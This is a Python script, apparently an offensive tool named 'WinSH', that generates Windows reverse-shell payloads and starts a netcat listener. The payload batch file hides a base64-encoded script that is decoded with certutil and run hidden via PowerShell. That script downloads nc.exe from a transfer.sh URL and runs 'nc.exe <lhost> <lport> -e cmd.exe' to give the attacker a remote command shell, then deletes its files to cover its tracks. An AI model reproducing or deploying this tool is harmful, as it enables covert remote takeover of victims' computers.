from socket import *
import base64, random, os

banner = ''' __        ___       ____  _   _ 
 \\ \\      / (_)_ __ / ___|| | | |
  \\ \\ /\\ / /| | '_ \\\\___ \\| |_| |
   \\ V  V / | | | | |___) |  _  |
    \\_/\\_/  |_|_| |_|____/|_| |_|
 ===================================\n'''
banner += '\tCoded by 00111111\n\n'
print(banner)
                                
commands = {
    'help':'show this mensage',
    'listen':'start listener',
    'generate':'generate payload',
    'exit':'close the program'
}
def generate(lhost,lport):
    out_name = raw_input('Output basename: ')
    payload ='''cd %temp%
echo @echo off >> bd.bat
echo powershell -Command "(New-Object Net.WebClient).DownloadFile('https://transfer.sh/pMOJi/nc.exe', '%temp%/nc.exe')" >>bd.bat
echo nc.exe '''+lhost+''' '''+lport+''' -e cmd.exe >>bd.bat
echo del nc.exe >> bd.bat
echo del bd.bat >> bd.bat
powershell -W hidden ./bd.bat
del bd.bat'''
    payload = base64.b64encode(payload)
    with open(out_name+'.bat','w') as out_file:
        name = str(random.randint(0,99))+lport+'_temp_'
        code = '''@echo off
del "'''+name+'''.txt" 2>nul
del '''+name+'''.bat 2>nul
cd %temp%
echo '''+payload+''' > '''+name+'''.txt
certutil -decode '''+name+'''.txt '''+name+'''.bat >nul 2>nul
'''+name+'''.bat
del '''+name+'''.txt
del '''+name+'''.bat'''
        out_file.write(code)
        out_file.close()
        print('Payload saved as: %s' %(out_name+'.bat'))
def show_help():
    help_msg = 'Command  Info\n'
    for cmd in commands:
        help_msg += '%s     %s\n' %(cmd,commands[cmd])
    return help_msg
def listen(port):
    os.system('nc -lvnp %s' %port)
def menu():
    while 1:
        cmd = raw_input('winsh> ')
        args = cmd.split(' ')
        if cmd not in commands and args[0] not in commands:
            print('Invalid command type "help" or "?" for help')
        if cmd == 'help' or cmd == '?':
            print(show_help())
        if args[0] == 'generate':
            if len(args) >= 3:
                lhost = args[1]
                lport = args[2]
                generate(lhost, lport)
            else:
                print('Usage: generate <lhost> <lport>')
        if args[0] == 'listen':
            if len(args) >= 2:
                lport = args[1]
                listen(lport)
            else:
                print('Usage: listen <lport>')
        if cmd == 'exit':
            exit()
            break
menu() 
